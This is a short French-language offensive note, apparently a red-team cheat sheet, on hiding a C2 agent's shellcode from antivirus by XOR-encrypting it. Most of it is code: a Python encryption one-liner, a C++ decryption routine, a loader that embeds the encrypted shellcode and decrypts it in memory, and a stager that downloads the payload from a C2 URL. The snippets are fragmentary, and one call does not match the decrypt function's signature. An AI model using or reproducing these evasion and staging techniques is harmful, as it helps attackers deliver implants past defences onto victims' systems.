
Chiffrer le shellcode côté serveur pour que l'AV ne puisse pas le scanner via le réseau.


# XOR

**Chifrrement**
```bash
python -c "
key = b'monkey'
data = open('agent.x64.bin','rb').read()
open('agent.x64.bin.enc','wb').write(bytes(b ^ key[i%len(key)] for i,b in enumerate(data)))
"
```

**Déchiffrement**
```cpp
void xor_decrypt(std::vector<BYTE>& data, const std::string& key)
{
    for (size_t i = 0; i < data.size(); ++i)
        data[i] ^= key[i % key.size()];
}
```

# Stageless

```bash
xxd -i agent.x64.bin.enc | tr -s ' \n' ' ' > shellcode.h
```

```cpp
#include "shellcode.h"

int main()
{
    // copie du shellcode chiffré embarqué dans l'exe → déchiffrement en mémoire
    unsigned int shellcode_len = agent_x64_bin_enc_len;
    unsigned char* shellcode = new unsigned char[shellcode_len];
    memcpy(shellcode, agent_x64_bin_enc, shellcode_len);
    xor_decrypt(shellcode, shellcode_len, "monkey");
```

# Stager

```cpp
int main()
{
    std::vector<BYTE> payload;
    download(L"https://mon-c2/agent.x64.bin.enc", payload);
    xor_decrypt(payload, "monkey");
```